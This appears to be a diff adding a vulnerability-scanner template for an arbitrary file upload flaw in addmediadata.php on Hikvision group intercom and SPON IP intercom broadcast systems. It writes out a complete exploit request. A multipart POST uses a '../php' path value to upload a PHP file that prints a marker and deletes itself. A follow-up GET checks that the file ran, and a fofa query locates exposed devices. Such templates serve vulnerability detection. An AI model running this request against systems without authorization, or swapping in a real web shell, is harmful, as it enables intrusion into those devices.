@@ -1,0 +1,54 @@
+id: hikvision-spon-group-intercom-addmediadata-fileupload
+info:
+  name: hikvision 群组对讲服务配置平台 or 世邦通信 SPON IP 网络对讲广播系统 addmediadata.php - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/luck-ying/Library-POC/blob/master/SPON_IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F/SPON%20IP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9F%20addmediadata.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.py
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-1830859634" || body="js/jquery.breadcrumbs.ex.js"
+  tags: 2021,fileupload,spon,hikvision
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /php/addmediadata.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16
+        Content-Length: 514
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+        ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
+        Content-Type: text/plain
+
+        <?php print("{{randstr}}");unlink(__FILE__);?>
+
+        ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
+        Content-Disposition: form-data; name="subpath"
+
+
+        ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
+        Content-Disposition: form-data; name="fullpath"
+
+        ../php
+        ------WebKitFormBoundary4LuoBRpTiVBo9cIQ--'''
+        
+      - |+
+        GET /php/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
